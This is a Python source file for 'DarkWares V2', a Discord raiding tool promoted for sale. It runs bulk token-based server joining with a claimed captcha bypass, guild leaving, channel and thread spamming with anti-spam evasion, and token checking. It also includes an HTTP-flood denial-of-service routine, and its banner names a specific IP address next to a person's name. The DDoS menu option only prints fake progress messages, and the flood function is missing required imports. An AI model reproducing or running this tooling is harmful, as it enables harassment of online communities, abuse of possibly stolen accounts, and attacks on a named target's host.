import colorama
import sys
import time
from colorama import init, Fore, Style
from rich.progress import Progress, BarColumn
from concurrent.futures import ThreadPoolExecutor, thread
import re
import http.client
import ctypes
import sys
import threading
import json
import mysql.connector
import mysql
import random
import string
import threading
import requests
import sys
import keyboard
import random
import string
import os
import pypresence
from pypresence import Presence
import discord_webhook
import json
import pyfiglet
import re
import http.client
import pystyle
from pystyle import *

import sys
import time
import platform
import os
import hashlib
from time import sleep
from datetime import datetime
import os
import json as jsond  # json
import time  # sleep before exit
import binascii  # hex encoding
from uuid import uuid4  # gen random guid
import platform  # check platform
import subprocess  # needed for mac device
import hmac # signature checksum
import hashlib # signature checksum

RPC = Presence(1125153265538039898)
RPC.connect()
start_time=time.time()

def banner():
    # Generate ASCII art
    art = r'''
                                        ________      _____ __________ ____  __.__      __  _____ _____________________ _________
                                        \______ \    /  _  \\______   \    |/ _/  \    /  \/  _  \\______   \_   _____//   _____/
                                         |    |  \  /  /_\  \|       _/      < \   \/\/   /  /_\  \|       _/|    __)_ \_____  \ 
                                         |    `   \/    |    \    |   \    |  \ \        /    |    \    |   \|        \/        \
                                        /_______  /\____|__  /____|_  /____|__ \ \__/\  /\____|__  /____|_  /_______  /_______  /
                                                 \/         \/       \/        \/      \/         \/       \/        \/        \/ 


                                                                        Developed By RaweTea
                                                                        Auth By flr, rejd
                                                                            
                                            
                                                    +——————————————————————————————+——————————————————————————————+
                                                                                                            
                                                         1. Joiner         4. DDoS ( 188.175.12.191 Kwertzyy )                
                                                         2. Lefter         5. Threads Spammer      
                                                         3. Spammer        6. Token Checker                
                                                                                                            
                                                    +——————————————————————————————+——————————————————————————————+
    '''
    # Define the gradient colors
    colors = [Fore.WHITE, Fore.RED]

    # Calculate the diagonal angle in radians
    angle = 45
    angle_rad = angle * (3.14159 / 180)

    # Apply the diagonal linear gradient effect to each line of the ASCII art
    gradient_art = ""
    for i, line in enumerate(art.splitlines()):
        colored_line = ""
        for j, character in enumerate(line):
            distance = i + j
            color_index = (distance // 5) % len(colors)
            color = colors[color_index]
            colored_line += color + character
        gradient_art += colored_line + Style.RESET_ALL + "\n"

    # Print the gradient ASCII art
    print(gradient_art)

def log_msg(message):
    try:
        requests.post("http://127.0.0.1:5000/log", data={"log": message})
    except:
        pass

def log(message):
    threading.Thread(target=log_msg, args=(message,)).start()

init()
Online = True

license = "No License"
pool_sema = threading.Semaphore(value=30)

# Generate loading titles
loading_titles = [
    "Loading.",
    "Loading..",
    "Loading..."
]

# Display loading titles
for title in loading_titles:
    os.system("title " + title)
    time.sleep(0.7)

os.system("cls")
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)

os.system("cls")
tokens = open("tokens.txt", "r").read().splitlines()
RPC.update(state=f"᲼᲼━━━━━━◆━━━━━━᲼᲼", details=f"┃ Loaded {len(tokens)} tokens. ┃", large_image="dispfpp", large_text="dsc.gg/darkwaresv2", buttons = [{"label": "Buy Here", "url": "https://discord.gg/Wdq2tAsCTP"}])
os.system("title DarkWares ┃ V2 ┃ Made By RaweTea ┃ Fixed by flr, rejd ┃ dsc.gg/darkwaresv2")


def randstr(length):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def typingPrint(text):
    for character in text:
        sys.stdout.write(character)
        sys.stdout.flush()
        time.sleep(0.03)

def go_back_to_menu():
    print(Fore.RED + "\n[!] Going back to menu...\n")
    time.sleep(1)
    banner()

def leave(guild_id, token):
	pool_sema.acquire()
	try:
		data = {"lurking": False}
		headers = {
			":authority": "canary.discord.com",
			":method": "DELETE",
			":path": "/api/v9/users/@me/guilds/" + guild_id,
			":scheme": "https",
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "en-GB",
			"authorization": token,
			"content-length": "17",
			"content-type": "application/json",
			'Cookie': f'__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US',
			"origin": "https://canary.discord.com",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.40 Chrome/91.0.4472.164 Electron/13.2.2 Safari/537.36",
			"x-debug-options": "bugReporterEnabled",
			"x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC40MCIsIm9zX3ZlcnNpb24iOiIxMC4wLjIyMDAwIiwib3NfYXJjaCI6Ing2NCIsInN5c3RlbV9sb2NhbGUiOiJzayIsImNsaWVudF9idWlsZF9udW1iZXIiOjk2MzU1LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
		}
		a = requests.delete("https://canary.discord.com/api/v9/users/@me/guilds/" + str(guild_id), json=data, headers=headers)
		if a.status_code == 204:
			print(colorama.Fore.WHITE + "[+] Left " + guild_id + "! [" + token + "]")
		else:
			print(colorama.Fore.RED + f"[-] Discord Banned Your Token. Error: {a.text} [{token}]")
	except Exception as e:
		log(str(e))
	finally:
		pool_sema.release()

def spam(tokens, channel_id, text, antispam, delay):
    while True:
        token = random.choice(tokens)
        threading.Thread(target=send_message, args=(token, channel_id, text, antispam)).start()
        time.sleep(delay)

def send_message(token, channel_id, text, antispam):
	request = requests.Session()
	headers = {
		'Authorization': token,
		'Content-Type': 'application/json',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
	}
	if antispam:
		text += " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
	payload = {"content": text, "tts": False}
	src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel_id}/messages", headers=headers, json=payload, timeout=10)
	if src.status_code == 429:
		try:
			ratelimit = json.loads(src.content)
			print(colorama.Fore.RED + "[-] Ratelimit for " + str(float(ratelimit['retry_after']/1000)) + " seconds! [" + token + "]")
		except:
			print(colorama.Fore.RED + "[-] Ratelimit for " + str(float(ratelimit['retry_after']/1000)) + " seconds! [" + token + "]")
	if src.status_code == 200:
		print(colorama.Fore.WHITE + "[+] Message sent! [" + token + "]")
	else:
		print(colorama.Fore.RED + "[-] Ratelimit for " + str(float(ratelimit['retry_after']/1000)) + " seconds! [" + token + "]")
	return src

def thread_spammer(channel_id2, msg2, thread_name, token):
    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-GB",
        "authorization": token,
        "content-length": "90",
        "content-type": "application/json",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
    while True:
        try:
            thread_name_new = thread_name + " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
            data = {"name": thread_name_new, "type": "11", "auto_archive_duration": "1440", "location": "Thread Browser Toolbar"}
            out = requests.post(f"https://discord.com/api/v9/channels/{str(channel_id2)}/threads", headers=headers, json=data)
            if out.status_code == 200:
                try:
                    print(Fore.RED + "Spamming Message...""["+ token +"]")
                except:
                    pass
            else:
                thread_id = out.json()["id"]
                print(Fore.WHITE + "[+] Thread " + thread_name + " created! [" + token + "]")
                send_message(token, thread_id, msg2, False)
        except Exception as e:
            # log(str(e) + " " + str(out.status_code) + " " + str(out.json()))
            pass

def get_headers(token):
	return {
		'Content-Type': 'application/json',
		'Accept': '*/*',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'en-US',
		'Cookie': f'__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US',
		'DNT': '1',
		'origin': 'https://discord.com',
		'TE': 'Trailers',
		'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
		'authorization': token,
		'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
	}

def join(invite, token):
    pool_sema.acquire()
    try:
        try:
            headers = {':authority':'canary.discord.com', 
             ':method':'POST', 
             ':path':'/api/v9/invites/' + invite, 
             ':scheme':'https', 
             'accept':'*/*', 
             'accept-encoding':'gzip, deflate, br', 
             'accept-language':'en-US', 
             'authorization':token, 
             'content-length':'0', 
             'Cookie':f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US", 
             'origin':'https://canary.discord.com', 
             'sec-fetch-dest':'empty', 
             'sec-fetch-mode':'cors', 
             'sec-fetch-site':'same-origin', 
             'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36          ', 
             'x-context-properties':'eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==      ', 
             'x-debug-options':'bugReporterEnabled', 
             'x-super-properties':'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}
            a = requests.post(('https://discordapp.com/api/v9/invites/' + invite), headers=headers)
            if a.status_code == 200:
                print(colorama.Fore.WHITE + '[+] Joined a server with ' + invite + '! [' + token + ']')
            else:
                print(colorama.Fore.RED + f"[-] Discord banned your Token. Error: {a.text} [{token}]")
        except Exception as e:
            try:
                print(colorama.Fore.RED + f"[-] Discord banned your Token. Error: {str(e)} [{token}]")
            finally:
                e = None
                del e

    finally:
        pool_sema.release()

def ddos():
	ip = str(input('[+] IP Target [>] '))
	port = int(input('[+] Port [>] '))
	pack = int(input('[+] Packet per second [>] '))
	thread = int(input('[+] Threads [>] '))
	def start():
		global useragents, ref, acceptall
		hh = random._urandom(3016)
		xx = int(0)
		useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
		accept = random.choice(acceptall)
		reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
		content    = "Content-Type: application/x-www-form-urlencoded\r\n"
		length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
		target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
		main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((str(ip),int(port)))
				s.send(str.encode(main_req))
				for i in range(pack):
					s.send(str.encode(main_req))
				xx += random.randint(0, int(pack))
				print("[$] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
			except:
				s.close()
				print('[+] Server Down.')

	for x in range(thread):
		thred = threading.Thread(target=start)
		thred.start()


# Get user's choice
while True:
    banner()
    choice = input(Fore.WHITE + "└ choose: ")

    if choice == "1":
        typingPrint("Joiner with hCaptcha bypass")
        print("")
        typingPrint(f'{Fore.RED}| {Fore.WHITE} Invite [>] ')
        invite = input()
        invite = invite.replace("https://discord.gg/", "")
        invite = invite.replace("https://discord.com/invite/", "")
        invite = invite.replace("discord.gg/", "")
        invite = invite.replace("dsc.gg/", "")
        tokens = open("tokens.txt", "r").read().splitlines()
        for token in tokens:
            threading.Thread(target=join, args=(invite, token)).start()
        go_back_to_menu()
    elif choice == "2":
        typingPrint("Normal Token Leaver From Guild")
        tokens = open("tokens.txt", "r").read().splitlines()
        print("")
        typingPrint(f'{Fore.RED}| {Fore.WHITE}Guild ID [>] ')
        guild_id = input()
        for token in tokens:
            threading.Thread(target=leave, args=(guild_id, token)).start()
        go_back_to_menu()
    elif choice == '3':
        typingPrint("Fastest Spammer in the raider world!")
        tokens = open("tokens.txt", "r").read().splitlines()
        print("")
        channel_id = input(f'{Fore.RED}| {Fore.WHITE} Channel ID [>] ')
        delay = input(f'{Fore.RED}| {Fore.WHITE} Delay [100-150 recommended] [>] ')
        msg = input(f'{Fore.RED}| {Fore.WHITE} Message [>] ')
        antispam = input(f'{Fore.RED}| {Fore.WHITE} Bypass AntiSpam [y/n]: ').lower()
        speed = input(f'{Fore.RED}| {Fore.WHITE} Speed Mode [y/n]: ').lower()

        if antispam == "y":
            antispam = True
        else:
            antispam = False

        if speed == "y":
            speed = True
        else:
            speed = False

        delay = int(delay) / 1000

        if channel_id == "" or msg == "":
            print(Fore.RED + "You didn't fill the input try again!")
            go_back_to_menu()
        else:
            threading.Thread(target=spam, args=(tokens, channel_id, msg, antispam, delay)).start()
            print(Fore.YELLOW + "[!] Spamming... Press 'ESC' to stop.")
            while Online:
                if keyboard.is_pressed('esc'):
                    Online = False
                time.sleep(0.1)
            go_back_to_menu()
    elif choice == "4":
        typingPrint("DDoS Kwertzyy thanks a lot guyss")
        print("")
        ip = input(f'{Fore.RED}| {Fore.WHITE} IP Target [>] ')
        port = input(f'{Fore.RED}| {Fore.WHITE} Port [>] ')
        pack = input(f'{Fore.RED}| {Fore.WHITE} Packet per second [>] ')
        thread = input(f'{Fore.RED}| {Fore.WHITE} Threads [>] ')

        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print("")
        time.sleep(1)
        go_back_to_menu()
    elif choice == "5":
        typingPrint("Threads Spammer (You can get rate limit for 2 days by Discord Security)")
        time.sleep(3)
        tokens = open("tokens.txt", "r").read().splitlines()
        print()
        channel_id2 = input(f'{Fore.RED}| {Fore.WHITE} Channel ID: ')
        thrad_name = input(f'{Fore.RED}| {Fore.WHITE} Thread Name: ')
        msg2 = input(f'{Fore.RED}| {Fore.WHITE} Message: ')
            
        if channel_id2 == "" or msg2 == "":
                print(Fore.RED + "You didn't fill the input try again!")
                go_back_to_menu()
            
        for token in tokens:
                threading.Thread(target=thread_spammer, args=(channel_id2, msg2, thrad_name, token)).start()
                print(Fore.YELLOW + "[!] Spamming Threads... Press 'ESC' to stop.")
        while Online:
                time.sleep(2)
                if keyboard.is_pressed('esc'):
                    Online = False
                    break
                time.sleep(0.1)
        go_back_to_menu()
    elif choice == "6":
        print("Token Checker selected. Performing action...")
        print("")
        with open("tokens.txt") as f:
            for line in f:
                token = line.strip("\n")
                headers = {'Content-Type': 'application/json', 'authorization': token}
                url = "https://discordapp.com/api/v6/users/@me/library"
                r = requests.get(url, headers=headers)
                if r.status_code == 200:
                    print(f"{Fore.RED}| {Fore.WHITE} Token work! {Fore.GREEN}["+ token +"]")
                else:
                    print(f"{Fore.RED}| {Fore.WHITE} Token doesn´t work! {Fore.RED}["+ token +"]")
                time.sleep(0.2)
            go_back_to_menu()
    elif choice == 7:
        break
            
    else:
        typingPrint("Invalid choice.")
        time.sleep(3)
        os.system("cls")
    go_back_to_menu()
